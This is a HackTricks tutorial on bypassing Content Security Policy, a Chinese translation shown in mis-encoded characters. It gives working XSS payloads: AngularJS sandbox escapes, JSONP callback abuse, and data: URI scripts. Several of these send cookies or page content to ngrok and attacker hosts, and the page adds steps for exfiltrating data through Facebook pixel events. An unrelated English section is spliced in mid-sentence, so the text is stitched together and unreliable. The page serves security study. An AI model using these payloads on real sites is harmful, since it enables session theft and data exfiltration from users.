# å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ç»•è¿‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£åŠæ—¶äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
éšæ—¶äº†è§£æœ€æ–°çš„èµé‡‘è®¡åˆ’å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œç«‹å³ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

## ä»€ä¹ˆæ˜¯CSP

å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰è¢«è®¤ä¸ºæ˜¯ä¸€ç§æµè§ˆå™¨æŠ€æœ¯ï¼Œä¸»è¦æ—¨åœ¨**é˜²èŒƒè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ç­‰æ”»å‡»**ã€‚å®ƒé€šè¿‡å®šä¹‰å’Œè¯¦ç»†è¯´æ˜æµè§ˆå™¨å¯ä»¥å®‰å…¨åŠ è½½èµ„æºçš„è·¯å¾„å’Œæ¥æºæ¥å‘æŒ¥ä½œç”¨ã€‚è¿™äº›èµ„æºåŒ…æ‹¬å„ç§å…ƒç´ ï¼Œå¦‚å›¾åƒã€æ¡†æ¶å’ŒJavaScriptã€‚ä¾‹å¦‚ï¼Œç­–ç•¥å¯èƒ½å…è®¸ä»åŒä¸€åŸŸï¼ˆselfï¼‰åŠ è½½å’Œæ‰§è¡Œèµ„æºï¼ŒåŒ…æ‹¬å†…è”èµ„æºå’Œé€šè¿‡`eval`ã€`setTimeout`æˆ–`setInterval`ç­‰å‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²ä»£ç ã€‚

CSPçš„å®æ–½é€šè¿‡**å“åº”å¤´**æˆ–å°†**å…ƒç´ åµŒå…¥HTMLé¡µé¢**è¿›è¡Œã€‚æ ¹æ®æ­¤ç­–ç•¥ï¼Œæµè§ˆå™¨ä¼šä¸»åŠ¨æ‰§è¡Œè¿™äº›è§„å®šï¼Œå¹¶ç«‹å³é˜»æ­¢ä»»ä½•æ£€æµ‹åˆ°çš„è¿è§„è¡Œä¸ºã€‚

- é€šè¿‡å“åº”å¤´å®æ–½ï¼š
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- é€šè¿‡ meta æ ‡ç­¾å®ç°ï¼š
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

CSPå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ ‡å¤´æ¥å¼ºåˆ¶æ‰§è¡Œæˆ–ç›‘æ§ï¼š

- `Content-Security-Policy`ï¼šå¼ºåˆ¶æ‰§è¡ŒCSPï¼›æµè§ˆå™¨ä¼šé˜»æ­¢ä»»ä½•è¿è§„è¡Œä¸ºã€‚
- `Content-Security-Policy-Report-Only`ï¼šç”¨äºç›‘æ§ï¼›æŠ¥å‘Šè¿è§„è¡Œä¸ºè€Œä¸é˜»æ­¢å®ƒä»¬ã€‚é€‚ç”¨äºåœ¨é¢„ç”Ÿäº§ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•ã€‚

### å®šä¹‰èµ„æº

CSPé™åˆ¶äº†åŠ è½½æ´»åŠ¨å’Œè¢«åŠ¨å†…å®¹çš„æ¥æºï¼Œæ§åˆ¶è¯¸å¦‚å†…è”JavaScriptæ‰§è¡Œå’Œä½¿ç”¨`eval()`ç­‰æ–¹é¢ã€‚ä¸€ä¸ªç¤ºä¾‹ç­–ç•¥æ˜¯ï¼š
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### æŒ‡ä»¤

* **script-src**: å…è®¸ç‰¹å®šçš„ JavaScript æºï¼ŒåŒ…æ‹¬ URLã€å†…è”è„šæœ¬ä»¥åŠç”±äº‹ä»¶å¤„ç†ç¨‹åºæˆ– XSLT æ ·å¼è¡¨è§¦å‘çš„è„šæœ¬ã€‚
* **default-src**: å½“ç‰¹å®šçš„è·å–æŒ‡ä»¤ä¸å­˜åœ¨æ—¶ï¼Œä¸ºè·å–èµ„æºè®¾ç½®é»˜è®¤ç­–ç•¥ã€‚
* **child-src**: æŒ‡å®š Web Workers å’ŒåµŒå…¥å¼æ¡†æ¶å†…å®¹çš„å…è®¸èµ„æºã€‚
* **connect-src**: é™åˆ¶å¯ä»¥ä½¿ç”¨ fetchã€WebSocketã€XMLHttpRequest ç­‰æ¥å£åŠ è½½çš„ URLã€‚
* **frame-src**: é™åˆ¶æ¡†æ¶çš„ URLã€‚
* **frame-ancestors**: æŒ‡å®šå“ªäº›æ¥æºå¯ä»¥åµŒå…¥å½“å‰é¡µé¢ï¼Œé€‚ç”¨äº `<frame>`ã€`<iframe>`ã€`<object>`ã€`<embed>` å’Œ `<applet>` ç­‰å…ƒç´ ã€‚
* **img-src**: å®šä¹‰å›¾åƒçš„å…è®¸æ¥æºã€‚
* **font-src**: æŒ‡å®šä½¿ç”¨ `@font-face` åŠ è½½çš„å­—ä½“çš„æœ‰æ•ˆæ¥æºã€‚
* **manifest-src**: å®šä¹‰åº”ç”¨æ¸…å•æ–‡ä»¶çš„å…è®¸æ¥æºã€‚
* **media-src**: å®šä¹‰åŠ è½½åª’ä½“å¯¹è±¡çš„å…è®¸æ¥æºã€‚
* **object-src**: å®šä¹‰ `<object>`ã€`<embed>` å’Œ `<applet>` å…ƒç´ çš„å…è®¸æ¥æºã€‚
* **base-uri**: æŒ‡å®šä½¿ç”¨ `<base>` å…ƒç´ åŠ è½½çš„å…è®¸ URLã€‚
* **form-action**: åˆ—å‡ºè¡¨å•æäº¤çš„æœ‰æ•ˆç«¯ç‚¹ã€‚
* **plugin-types**: é™åˆ¶é¡µé¢å¯ä»¥è°ƒç”¨çš„ MIME ç±»å‹ã€‚
* **upgrade-insecure-requests**: æŒ‡ç¤ºæµè§ˆå™¨å°† HTTP URL é‡å†™ä¸º HTTPSã€‚
* **sandbox**: åº”ç”¨ç±»ä¼¼äº `<iframe>` çš„ sandbox å±æ€§çš„é™åˆ¶ã€‚
* **report-to**: æŒ‡å®šè¿åç­–ç•¥æ—¶å°†å‘é€æŠ¥å‘Šçš„ç»„ã€‚
* **worker-src**: æŒ‡å®š Workerã€SharedWorker æˆ– ServiceWorker è„šæœ¬çš„æœ‰æ•ˆæ¥æºã€‚
* **prefetch-src**: æŒ‡å®šå°†è¢«è·å–æˆ–é¢„è·å–çš„èµ„æºçš„æœ‰æ•ˆæ¥æºã€‚
* **navigate-to**: é€šè¿‡ä»»ä½•æ–¹å¼é™åˆ¶æ–‡æ¡£å¯ä»¥å¯¼èˆªåˆ°çš„ URLï¼ˆaã€formã€window.locationã€window.open ç­‰ï¼‰ã€‚

### æ¥æº

* `*`: å…è®¸æ‰€æœ‰ URLï¼Œé™¤äº†ä½¿ç”¨ `data:`ã€`blob:`ã€`filesystem:` æ–¹æ¡ˆçš„ URLã€‚
* `'self'`: å…è®¸ä»ç›¸åŒåŸŸåŠ è½½ã€‚
* `'data'`: å…è®¸é€šè¿‡ data æ–¹æ¡ˆåŠ è½½èµ„æºï¼ˆä¾‹å¦‚ï¼ŒBase64 ç¼–ç çš„å›¾åƒï¼‰ã€‚
* `'none'`: é˜»æ­¢ä»ä»»ä½•æ¥æºåŠ è½½ã€‚
* `'unsafe-eval'`: å…è®¸ä½¿ç”¨ `eval()` å’Œç±»ä¼¼æ–¹æ³•ï¼Œå‡ºäºå®‰å…¨åŸå› ä¸å»ºè®®ä½¿ç”¨ã€‚
* `'unsafe-hashes'`: å¯ç”¨ç‰¹å®šå†…è”äº‹ä»¶å¤„ç†ç¨‹åºã€‚
* `'unsafe-inline'`: å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è” `<script>` æˆ– `<style>`ï¼Œå‡ºäºå®‰å…¨åŸå› ä¸å»ºè®®ä½¿ç”¨ã€‚
* `'nonce'`: ä½¿ç”¨åŠ å¯† nonceï¼ˆä¸€æ¬¡æ€§æ•°å­—ï¼‰ä¸ºç‰¹å®šå†…è”è„šæœ¬è®¾ç½®ç™½åå•ã€‚
* `'sha256-<hash>'`: ä¸ºå…·æœ‰ç‰¹å®š sha256 å“ˆå¸Œçš„è„šæœ¬è®¾ç½®ç™½åå•ã€‚
* `'strict-dynamic'`: å¦‚æœå·²é€šè¿‡ nonce æˆ–å“ˆå¸Œè®¾ç½®ç™½åå•ï¼Œåˆ™å…è®¸ä»ä»»ä½•æ¥æºåŠ è½½è„šæœ¬ã€‚
* `'host'`: æŒ‡å®šç‰¹å®šä¸»æœºï¼Œå¦‚ `example.com`ã€‚
* `https:`: é™åˆ¶ä»…ä½¿ç”¨ HTTPS çš„ URLã€‚
* `blob:`: å…è®¸ä» Blob URL åŠ è½½èµ„æºï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ JavaScript åˆ›å»ºçš„ Blob URLï¼‰ã€‚
* `filesystem:`: å…è®¸ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½èµ„æºã€‚
* `'report-sample'`: åœ¨è¿è§„æŠ¥å‘Šä¸­åŒ…å«è¿è§„ä»£ç çš„ç¤ºä¾‹ï¼ˆç”¨äºè°ƒè¯•ï¼‰ã€‚
* `'strict-origin'`: ç±»ä¼¼äº 'self'ï¼Œä½†ç¡®ä¿æ¥æºçš„åè®®å®‰å…¨çº§åˆ«ä¸æ–‡æ¡£åŒ¹é…ï¼ˆåªæœ‰å®‰å…¨æ¥æºæ‰èƒ½ä»å®‰å…¨æ¥æºåŠ è½½èµ„æºï¼‰ã€‚
* `'strict-origin-when-cross-origin'`: åœ¨è¿›è¡ŒåŒæºè¯·æ±‚æ—¶å‘é€å®Œæ•´ URLï¼Œä½†åœ¨è·¨æºè¯·æ±‚æ—¶ä»…å‘é€æ¥æºã€‚
* `'unsafe-allow-redirects'`: å…è®¸åŠ è½½å°†ç«‹å³é‡å®šå‘åˆ°å¦ä¸€ä¸ªèµ„æºçš„èµ„æºã€‚ä¸å»ºè®®ä½¿ç”¨ï¼Œå› ä¸ºä¼šé™ä½å®‰å…¨æ€§ã€‚

## ä¸å®‰å…¨çš„ CSP è§„åˆ™

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
å·¥ä½œè´Ÿè½½ï¼š`"/><script>alert(1);</script>`

#### self + 'unsafe-inline' é€šè¿‡ Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼š
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

å¦‚æœä½ å¯ä»¥ä»¥æŸç§æ–¹å¼ä½¿**å…è®¸çš„ JS ä»£ç åˆ›å»ºä¸€ä¸ªæ–°çš„è„šæœ¬æ ‡ç­¾**åœ¨ DOM ä¸­ï¼Œå› ä¸ºä¸€ä¸ªå…è®¸çš„è„šæœ¬æ­£åœ¨åˆ›å»ºå®ƒï¼Œé‚£ä¹ˆ**æ–°çš„è„šæœ¬æ ‡ç­¾å°†è¢«å…è®¸æ‰§è¡Œ**ã€‚

### é€šé…ç¬¦ (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼š
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### ç¼ºä¹ object-src å’Œ default-src

{% hint style="danger" %}
**çœ‹èµ·æ¥è¿™ä¸ªæ–¹æ³•ä¸å†æœ‰æ•ˆ**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼š
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### æ–‡ä»¶ä¸Šä¼  + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ ä¸€ä¸ªJSæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ç»•è¿‡è¿™ä¸ªCSPï¼š

æœ‰æ•ˆè½½è·ï¼š
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
ç„¶è€Œï¼ŒæœåŠ¡å™¨å¾ˆå¯èƒ½æ­£åœ¨**éªŒè¯ä¸Šä¼ çš„æ–‡ä»¶**ï¼Œå¹¶ä¸”åªå…è®¸æ‚¨**ä¸Šä¼ ç‰¹å®šç±»å‹çš„æ–‡ä»¶**ã€‚

æ­¤å¤–ï¼Œå³ä½¿æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨æœåŠ¡å™¨æ¥å—çš„æ‰©å±•åï¼ˆå¦‚ï¼š_script.png_ï¼‰åœ¨æ–‡ä»¶ä¸­ä¸Šä¼ **JSä»£ç **ï¼Œè¿™ä¹Ÿæ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºä¸€äº›æœåŠ¡å™¨ï¼ˆå¦‚apacheæœåŠ¡å™¨ï¼‰**æ ¹æ®æ‰©å±•åé€‰æ‹©æ–‡ä»¶çš„MIMEç±»å‹**ï¼Œè€ŒåƒChromeè¿™æ ·çš„æµè§ˆå™¨å°†**æ‹’ç»æ‰§è¡Œåº”è¯¥æ˜¯å›¾åƒçš„å†…å®¹ä¸­çš„Javascript**ä»£ç ã€‚"å¹¸è¿çš„æ˜¯"ï¼Œå­˜åœ¨ä¸€äº›é”™è¯¯ã€‚ä¾‹å¦‚ï¼Œä»CTFä¸­æˆ‘å­¦åˆ°ï¼Œ**Apacheä¸è®¤è¯†**_**.wave**_æ‰©å±•åï¼Œå› æ­¤ä¸ä¼šä½¿ç”¨ç±»ä¼¼éŸ³é¢‘/\*çš„**MIMEç±»å‹**æä¾›å®ƒã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨å‘ç°äº†XSSå’Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”è®¾æ³•æ‰¾åˆ°äº†**è¢«é”™è¯¯è§£é‡Šçš„æ‰©å±•å**ï¼Œæ‚¨å¯ä»¥å°è¯•ä¸Šä¼ å¸¦æœ‰è¯¥æ‰©å±•åå’Œè„šæœ¬å†…å®¹çš„æ–‡ä»¶ã€‚æˆ–è€…ï¼Œå¦‚æœæœåŠ¡å™¨æ­£åœ¨æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ­£ç¡®æ ¼å¼ï¼Œè¯·åˆ›å»ºä¸€ä¸ªå¤šè¯­è¨€æ–‡ä»¶ï¼ˆ[è¿™é‡Œæœ‰ä¸€äº›å¤šè¯­è¨€ç¤ºä¾‹](https://github.com/Polydet/polyglot-database)ï¼‰ã€‚

### ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + ('unsafe-eval')

{% hint style="warning" %}
å¯¹äºä»¥ä¸‹ä¸€äº›æœ‰æ•ˆè½½è·ï¼Œ**`unsafe-eval`ç”šè‡³éƒ½ä¸æ˜¯å¿…éœ€çš„**ã€‚
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
åŠ è½½ä¸€ä¸ªæœ‰æ¼æ´çš„ Angular ç‰ˆæœ¬å¹¶æ‰§è¡Œä»»æ„çš„ JSï¼š
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### ä½¿ç”¨ Angular + ä¸€ä¸ªè¿”å› `window` å¯¹è±¡çš„å‡½æ•°åº“çš„æœ‰æ•ˆè½½è· ([æŸ¥çœ‹æ­¤æ–‡ç« ](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
è¯¥æ–‡ç« æ˜¾ç¤ºæ‚¨å¯ä»¥ä» `cdn.cloudflare.com`ï¼ˆæˆ–ä»»ä½•å…¶ä»–å…è®¸çš„ JS åº“å­˜å‚¨åº“ï¼‰**åŠ è½½**æ‰€æœ‰**åº“**ï¼Œæ‰§è¡Œæ¯ä¸ªåº“ä¸­æ·»åŠ çš„æ‰€æœ‰å‡½æ•°ï¼Œå¹¶æ£€æŸ¥**å“ªäº›å‡½æ•°ä»å“ªäº›åº“è¿”å› `window` å¯¹è±¡**ã€‚
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### æ»¥ç”¨è°·æ­Œ reCAPTCHA JS ä»£ç 

æ ¹æ®[**è¿™ç¯‡ CTF è§£å¯†**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨[https://www.google.com/recaptcha/](https://www.google.com/recaptcha/)åœ¨ CSP ä¸­æ‰§è¡Œä»»æ„ JS ä»£ç ï¼Œç»•è¿‡ CSPï¼š
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ`script-src` è¢«è®¾ç½®ä¸º `self` å’Œä¸€ä¸ªç‰¹å®šçš„åœ¨ç™½åå•ä¸­çš„åŸŸåï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ JSONP æ¥ç»•è¿‡ã€‚JSONP ç«¯ç‚¹å…è®¸ä½¿ç”¨ä¸å®‰å…¨çš„å›è°ƒæ–¹æ³•ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ‰§è¡Œ XSSï¼Œæœ‰æ•ˆè½½è·å¦‚ä¸‹ï¼š
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **åŒ…å«äº†ç”¨äºç»•è¿‡ä¸åŒç½‘ç«™CSPçš„JSONPç«¯ç‚¹ã€‚**

å¦‚æœ**å—ä¿¡ä»»çš„ç«¯ç‚¹åŒ…å«ä¸€ä¸ªå¼€æ”¾é‡å®šå‘**ï¼Œå°†ä¼šå‡ºç°ç›¸åŒçš„æ¼æ´ï¼Œå› ä¸ºå¦‚æœåˆå§‹ç«¯ç‚¹å—ä¿¡ä»»ï¼Œåˆ™é‡å®šå‘ä¹Ÿä¼šå—ä¿¡ä»»ã€‚

### ç¬¬ä¸‰æ–¹æ»¥ç”¨
æ­£å¦‚åœ¨[ä»¥ä¸‹å¸–å­](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses)ä¸­æ‰€è¿°ï¼Œè®¸å¤šç¬¬ä¸‰æ–¹åŸŸå¯èƒ½åœ¨CSPçš„æŸä¸ªåœ°æ–¹è¢«å…è®¸ï¼Œå¯ä»¥è¢«æ»¥ç”¨æ¥çªƒå–æ•°æ®æˆ–æ‰§è¡ŒJavaScriptä»£ç ã€‚å…¶ä¸­ä¸€äº›ç¬¬ä¸‰æ–¹æ˜¯ï¼š

| å®ä½“ | å…è®¸çš„åŸŸ | èƒ½åŠ› |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | çªƒå– |
| Hotjar | *.hotjar.com, ask.hotjar.io | çªƒå– |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | æ‰§è¡Œ |
| Amazon CloudFront | *.cloudfront.net | çªƒå–ï¼Œæ‰§è¡Œ |
| Amazon AWS | *.amazonaws.com | çªƒå–ï¼Œæ‰§è¡Œ |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | çªƒå–ï¼Œæ‰§è¡Œ |
| Salesforce Heroku	| *.herokuapp.com | çªƒå–ï¼Œæ‰§è¡Œ |
| Google Firebase | *.firebaseapp.com | çªƒå–ï¼Œæ‰§è¡Œ |

å¦‚æœåœ¨ç›®æ ‡çš„CSPä¸­å‘ç°ä»»ä½•å…è®¸çš„åŸŸï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æ‚¨å¯ä»¥é€šè¿‡åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡ä¸Šæ³¨å†Œæ¥ç»•è¿‡CSPï¼Œä»è€Œå°†æ•°æ®çªƒå–åˆ°è¯¥æœåŠ¡æˆ–æ‰§è¡Œä»£ç ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å‘ç°ä»¥ä¸‹CSPï¼š
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
## CSP Bypass Techniques

### Introduction

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, such as Cross Site Scripting (XSS) and data injection attacks. However, misconfigurations or weak policies can sometimes allow attackers to bypass CSP protections.

### Bypassing CSP using `unsafe-inline`

One common way to bypass CSP is by using the `unsafe-inline` keyword in the `script-src` directive. This allows the execution of inline JavaScript code, which is normally blocked by CSP to prevent XSS attacks.

### Bypassing CSP using data: URIs

Another technique involves using data: URIs to embed external resources inline. By using data: URIs, an attacker can load external scripts or stylesheets without triggering CSP violations.

### Bypassing CSP using `nonce` or `hash`

CSP allows the use of nonces or hashes to whitelist specific inline scripts. Attackers can bypass CSP by injecting scripts with valid nonces or hashes, tricking the browser into executing the malicious code.

### Bypassing CSP using WebSockets

Attackers can also bypass CSP by using WebSockets to establish a connection to a malicious server and receive instructions or payloads, effectively circumventing CSP restrictions on script sources.

### Conclusion

While CSP is a powerful security mechanism, it is crucial to configure it correctly to prevent bypasses. Regularly review and update your CSP policies to ensure they provide robust protection against various types of attacks.
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
ä½ åº”è¯¥èƒ½å¤Ÿåƒä»¥å¾€ä½¿ç”¨[Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/)é‚£æ ·ï¼Œçªƒå–æ•°æ®ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹ä¸€èˆ¬æ­¥éª¤æ“ä½œï¼š

1. åœ¨æ­¤å¤„åˆ›å»ºä¸€ä¸ªFacebookå¼€å‘è€…å¸æˆ·ã€‚
1. åˆ›å»ºä¸€ä¸ªæ–°çš„â€œFacebookç™»å½•â€åº”ç”¨ç¨‹åºï¼Œå¹¶é€‰æ‹©â€œç½‘ç«™â€ã€‚
1. è½¬åˆ°â€œè®¾ç½® -> åŸºæœ¬ä¿¡æ¯â€å¹¶è·å–æ‚¨çš„â€œåº”ç”¨IDâ€ã€‚
1. åœ¨æ‚¨æƒ³è¦ä»ä¸­çªƒå–æ•°æ®çš„ç›®æ ‡ç½‘ç«™ä¸Šï¼Œæ‚¨å¯ä»¥é€šè¿‡ç›´æ¥ä½¿ç”¨Facebook SDKå°å·¥å…·â€œfbqâ€å’Œæ•°æ®æœ‰æ•ˆè´Ÿè½½çš„â€œcustomEventâ€æ¥çªƒå–æ•°æ®ã€‚
1. è½¬åˆ°æ‚¨çš„åº”ç”¨ç¨‹åºâ€œäº‹ä»¶ç®¡ç†å™¨â€ï¼Œå¹¶é€‰æ‹©æ‚¨åˆ›å»ºçš„åº”ç”¨ç¨‹åºï¼ˆè¯·æ³¨æ„ï¼Œäº‹ä»¶ç®¡ç†å™¨å¯ä»¥åœ¨ç±»ä¼¼äºæ­¤URLçš„ä½ç½®æ‰¾åˆ°ï¼šhttps://www.facebook.com/events_manager2/list/pixel/[app-id]/test_eventsï¼‰ã€‚
1. é€‰æ‹©â€œæµ‹è¯•äº‹ä»¶â€é€‰é¡¹å¡ï¼Œä»¥æŸ¥çœ‹â€œæ‚¨çš„â€ç½‘ç«™å‘é€çš„äº‹ä»¶ã€‚

